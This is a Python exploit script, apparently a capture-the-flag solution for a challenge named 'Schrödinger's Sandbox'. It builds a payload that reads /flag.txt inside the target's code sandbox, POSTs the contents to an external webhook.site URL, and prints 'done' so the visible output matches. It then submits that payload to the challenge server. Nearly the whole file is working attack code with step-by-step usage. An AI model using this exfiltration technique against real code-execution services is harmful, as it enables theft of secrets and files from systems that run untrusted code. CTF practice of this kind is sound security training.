"""
Schr√∂dinger's Sandbox - Approach 1: HTTP Exfiltration

Send the flag to an external webhook. Both universes produce the same
stdout (e.g. "done"), so output matches. But we receive both flags at
our webhook and can identify the real one (format: 0xfun{...}).

Usage:
  1. Set up a webhook at https://webhook.site or similar
  2. Replace WEBHOOK_URL below
  3. Submit the generated payload to the challenge
"""

import requests
import json

TARGET = "http://chall.0xfun.org:11102"

# Replace with your webhook.site URL
WEBHOOK_URL = "https://webhook.site/2e17cadc-41a3-4a6b-805c-aceaef7d539b"

payload = f"""
import urllib.request, json
flag = open("/flag.txt").read().strip()
req = urllib.request.Request(
    "{WEBHOOK_URL}",
    data=json.dumps({{"flag": flag}}).encode(),
    headers={{"Content-Type": "application/json"}},
    method="POST"
)
try:
    urllib.request.urlopen(req, timeout=3)
except:
    pass
print("done")
"""

print(f"[*] Payload:\n{payload}")
print(f"[*] Submitting to {TARGET}...")

r = requests.post(
    f"{TARGET}/api/submit",
    json={"code": payload.strip()},
    timeout=10,
)
print(f"[*] Response: {r.status_code}")
print(r.text)
